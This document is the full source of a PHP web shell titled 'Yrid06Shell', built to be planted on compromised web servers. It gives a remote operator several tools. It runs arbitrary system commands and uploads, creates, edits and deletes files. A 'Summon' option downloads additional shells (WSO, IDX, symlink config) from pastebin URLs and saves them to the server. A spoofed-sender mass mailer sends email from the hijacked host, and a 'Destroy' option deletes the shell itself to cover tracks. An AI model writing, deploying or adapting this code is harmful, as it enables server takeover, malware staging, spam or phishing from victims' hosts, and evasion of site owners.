<html>
<head>
<title>Yrid06Shell</title>
<style type="text/css">
@import url('https://fonts.googleapis.com/css?family=Courier');
body {
	background-color: black;
	font-family: Courier;
	color: white;
}

input[type=text] {
	background-color: transparent;
	border: 1px dotted #ffa502;
	color: white;
	padding-left: 5px;
	outline: none;
	width: 13.3%;
	margin-bottom: 5px;
}

input[type=submit] {
	background-color: transparent;
	border: 1px dotted #ffa502;
	color: white;
	cursor: pointer;
	margin-left: 2px;
	outline: none;
}

button {
	background-color: transparent;
	border: 1px dotted #ffa502;
	color: white;
	cursor: pointer;
	margin-top: 5px;
	width: 85px;
	outline: none;
	margin-bottom: 5px;
}

a {
	text-decoration: none;
	color: white;
}

textarea {
	width: 40%;
	height: 400px;
	background-color: transparent;
	border: 1px dotted #ffa502;
	color: white;
	outline: none;
}

.endec {
	width: 17.5%;
	height: 50px;
}

.mailer {
	width: 19.7%;
	height: 100px;
	margin-top: 5px;
	margin-bottom: 5px;
}

select {
	background-color: transparent;
	border: 1px dotted #ffa502;
	cursor: pointer;
	outline: none;
	color: gray;
	width: 8.7%;
}
</style>
</head>

<body>
<?php

#####################################
#									#
# 	Coded by Yrid06 - T1KUS90T		#
# fb.com/iamkuja - fb.com/T1KUS90T	#
#									#
#####################################

$host = $_SERVER['HTTP_HOST'];
$doc = getcwd();
$dir = explode("/", $doc);

echo "<pre><font color='#ffa502'>";
echo "__   __    _     _  ___   __   
\ \ / / __(_) __| |/ _ \ / /_  
 \ V / '__| |/ _` | | | | '_ \ 
  | || |  | | (_| | |_| | (_) |
  |_||_|  |_|\__,_|\___/ \___/ ";
echo "</font></pre>";
echo "IP: <font color='#ffa502'>".gethostbyname($host)."</font><br>";
echo "Website: <font color='#ffa502'>$host</font><br>";
echo "File Location: <font color='#ffa502'>";

foreach ($dir as $dir2 => $path) {
	echo "<a href='?dir=";
		for($i = 0; $i <= $dir2; $i++) {
			echo $dir[$i];
			if($i != $dir2) {
				echo "/";
			}
		}
		echo "'>$path</a>/";
}

if($_GET['dir']) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}

echo "<br><a href='?tools=cmd'><button>Command</button></a> <a href='?up=".$dir."&tools=upl'><button>Upload</button></a> <a href='?tools=mailer'><button>Mailer</button></a> <a href='?tools=endec'><button>EN/DEC</button></a><br><a href='?tools=newfile'><button>New File</button></a> <a href='?tools=newdir'><button>New Folder</button></a> <a href='?tools=summon'><button>Summon</button></a> <a href='?tools=destroy'><button><font color='#d63031'>Destroy</font></button></a>";

if($_GET['tools']=="cmd") {
	echo "<br><br><form method='post'><font color='white'>Command:</font> <input type='text' name='cmd' placeholder='command' required=''><input type='submit' name='submit' value='>>'></form>";

	if($_POST['submit']) {
		$cmd = $_POST['cmd'];
		if(function_exists('shell_exec')) {
			echo "<pre>".shell_exec($cmd)."</pre>";
		} elseif(function_exists('system')){
			echo "<pre>".system($cmd)."</pre>";
		} elseif (function_exists('passthru')) {
			echo "<pre>".passthru($cmd)."</pre>";
		} elseif(function_exists('exec')) {
			echo "<pre>".exec($cmd)."</pre>";
		} else {
			echo "Cannot run command!";
		}
	}

} elseif($_GET['tools'] == "destroy") {
	$file = basename($_SERVER['PHP_SELF']);
	unlink($file);

} elseif($_GET['tools'] == "summon") {
	echo "<br><br><form method='post'>
	<select name='list'>
	<option value='wso'>WSO SHELL</option>
	<option value='idx'>IDX SHELL</option>
	<option value='sym'>Symlink Config</option>
	<input type='submit' name='submit' value='Summon!'></form>";
	if($_POST['submit']) {
		$list = $_POST['list'];
		if($list == "wso") {
			$put = file_put_contents("wso.php", file_get_contents("http://pastebin.com/raw/uuWW5TCY"));
			if($put) {
				echo "<font color='white'>Summon Success</font> wso.php!";
			} else {
				echo "Summon Failed!";
			}
		} elseif($list == "idx") {
			$put = file_put_contents("idx.php", file_get_contents("http://pastebin.com/raw/nTAZr2MY"));
			if($put) {
				echo "<font color='white'>Summon Success</font> idx.php!";
			} else {
				echo "Summon Failed!";
			}
		} elseif($list == "sym") {
			$put = file_put_contents("sym.php", file_get_contents("http://pastebin.com/raw/PZvihMz8"));
			if($put) {
				echo "<font color='white'>Summon Success</font> sym.php!";
			} else {
				echo "Summon Failed!";
			}
		}
	}

} elseif($_GET['tools'] == "mailer") {
	echo "<br><br><form method='post' enctype='multipart/form-data'><font color='white'>Sender:</font>&nbsp;&nbsp;<input type='text' name='sender' placeholder='Sender Name' value='tikusgot'><br><font color='white'>Email:</font>&nbsp;&nbsp;
	<input type='text' name='eml' placeholder='Email' value='adm@$host'><br>
	<font color='white'>Subject:</font> 
	<input type='text' name='sbj' placeholder='Subject' value='Warning!!!'><br>
	<font color='white'>Letter:</font>&nbsp;&nbsp;<input type='file' name='letter'><br>
	<textarea class='mailer' name='mailist' placeholder='Mailist'></textarea><br>
	<input type='submit' style='margin-left: 0px;' name='submit' value='SEND!'></form>";
	if($_POST['submit']) {
		$eml = $_POST['eml'];
		$sbj = $_POST['sbj'];
		$mailist = $_POST['mailist'];
		$file = $_FILES['letter']['name'];
		@copy($_FILES['letter']['tmp_name'], $file);
		$letter = file_get_contents($file);
		$headers = "MIME-Version: 1.0"."\r\n";
		$headers .= "Content-Type: text/html; charset=UTF-8"."\r\n";
		$headers .= "From:".$_POST['sender']." <".$_POST['eml'].">";

		foreach (explode("\r\n", $mailist) as $mail) {
			$kirim = mail($mail,$sbj,$letter,$headers);
			if($kirim) {
				echo "[<font color='white'>X</font>] ".$mail." => <font color='green'>SENT!</font><br>";
			} else {
				echo "[<font color='white'>X</font>] ".$mail." => <font color='red'>FAIL!</font><br>";
			}
		}
	}

} elseif($_GET['tools'] == "endec") {
	echo "<br><br><a href='?tools=endec&menu=encode'><button>Encode</button></a> <a href='?tools=endec&menu=decode'><button>Decode</button></a>";

	if($_GET['menu'] == "encode") {
		echo "<form method='post'><input type='text' name='string' placeholder='Text to encode'><input type='submit' name='submit' value='Encode'></form>";
		if($_POST['submit']) {
			$text = $_POST['string'];
			$test = bin2hex($text);
			$test = chunk_split($test,2,'%');
			$test = "%".substr($test, 0, strlen($test) - 1);

			echo "<font color='white'>Base64:</font><br><textarea class='endec' readonly>".base64_encode($text)."</textarea>";
			echo "<br><br><font color='white'>Url Encode:</font><br><textarea class='endec' readonly>".$test."</textarea>";
			echo "<br><br><font color='white'>Hex:</font><br><textarea class='endec' readonly>".bin2hex($text)."</textarea>";
		}
	} elseif($_GET['menu'] == "decode") {
		echo "<form method='post'><input type='text' name='string' placeholder='Text to decode'><br><select name='dec'><option value='base64' selected>Base64</option><option value='url'>Url Encode</option><option value='hex'>Hex</option><input type='submit' name='submit' value='Decode'></select></form>";
		if($_POST['submit']) {
			$text = $_POST['string'];
			$decode = $_POST['dec'];
			if($decode == "base64") {
				echo "<font color='white'>Result:</font><br><textarea class='endec' readonly>".base64_decode($text)."</textarea>";
			} elseif($decode == "url") {
				$clear = str_replace("%", "", $text);
				echo "<font color='white'>Result:</font><br><textarea class='endec' readonly>".hex2bin($clear)."</textarea>";
			} elseif($decode == "hex") {
				echo "<font color='white'>Result:</font><br><textarea class='endec' readonly>".hex2bin($text)."</textarea>";
			}
		}
	}

} elseif($_GET['tools'] == "upl") {
	echo "<br><br><form method='post' enctype='multipart/form-data'><input type='file' name='files'><input type='submit' value='Upload!' name='upload'><form>";
	if($_POST['upload']) {
		$dir = $_GET['up'];
		$file = $_FILES['files']['name'];
		$tmp = $_FILES['files']['tmp_name'];
		$upl = move_uploaded_file($tmp, $dir."/".$file);
		if($upl) {
			echo "<br><br><font color='white'>Success upload</font> $dir/$file";
		} else {
			echo "<br><br>Upload failed!";
		}
	}

} elseif($_GET['tools'] == "newfile") {
	echo "<br><br><form method='post'><font color='white'>Filename:</font> <input type='text' name='fname' value='hack.php'><br><br><textarea name='fisi'></textarea><br><br><input type='submit' name='create' value='Create File!'></form>";
	if($_POST['create']) {
		$fname = $_POST['fname'];
		$fisi = $_POST['fisi'];
		$create = fwrite(fopen($fname, "w"),$fisi);
		if(!file_exists($fname)) {
			echo " Failed to create file!";
		} else {
			echo "<script>window.location ='?dir=".$dir."';</script>";
		}
	}

} elseif($_GET['tools'] == "newdir") {
	echo "<br><br><form method='post'><font color='white'>Dir Name:</font> <input type='text' name='dirname' value='hack'><input type='submit' value='Create Dir!' name='create'></form>";
	if($_POST['create']) {
		$dirname = $_POST['dirname'];
		$create = mkdir($dirname, 0777);
		if(!$create) {
			echo " Failed to create dir!";
		} else {
			echo "<script>window.location ='?dir=".$dir."';</script>";
		}
	}

} else {
	echo "<br>";
	$scan = scandir($dir);
	foreach ($scan as $dirz) {
		if(!is_dir($dirz)) {
			echo "<br><img src='http://icons.iconarchive.com/icons/zhoolego/material/512/Filetype-Docs-icon.png' width='20px' height='20px'> <a href='?dir=$dir&view=$dirz'>$dirz</a>";
		} else {
			echo "<br><img src='http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Blank-Folder-icon.png' width='20px' height='20px'> <a href=?dir=$dir/$dirz>$dirz</a>";
		}
	}
}

if($_GET['view']) {
	$file = $_GET['view'];
	$get = htmlspecialchars(file_get_contents($file));
	echo "<br><br><font color='white'>Filename:</font> $file<br><a href='?dir=$dir&view=$file&act=edit'><button>EDIT</button></a> <a href='?dir=$dir&view=$file&act=rename'><button>RENAME</button></a> <a href='?dir=$dir&view=$file&act=delete'><button>DELETE</button></a><br><form method='post'><textarea name='filez'>".$get."</textarea>";
	if($_GET['act'] == "edit") {
		$filez = $_POST['filez'];
		echo "<br><br><input type='submit' name='edit' value='Update'></form>";
		if($_POST['edit']) {
			$update = fwrite(fopen($file, 'w'),$filez);
			if($update) {
				echo "<script>window.location ='?dir=".$dir."';</script>";
			} else {
				echo " Edit Failed!";
			}
		}
	} elseif($_GET['act'] == "rename") {
		echo "<br><br><form method='post'><input type='text' name='newname' value='$file'><input type='submit' name='newnm' value='Rename'></form>";
		if($_POST['newnm']) {
			$newname = $_POST['newname'];
			$update = rename($file, $newname);
			if($update) {
				unlink($file);
				echo "<script>window.location ='?dir=".$dir."';</script>";
			} else {
				echo " Rename Failed!";
			}
		}
	} elseif($_GET['act'] == "delete") {
		$delete = unlink($file);
		if($delete) {
			echo "<script>window.location ='?dir=".$dir."';</script>";
		} else {
			echo "<br><br>Delete Failed!";
		}
	}
}

echo "<br><br><font face='calibri'>&copy; </font>".date('Y')." <a href='http://fb.com/Yrid06' target='_blank'>Yrid06</a> - <a href='http://fb.com/T1KUS90T' target='_blank'>T1KUS90T</a>.";
?>
</body>
</html>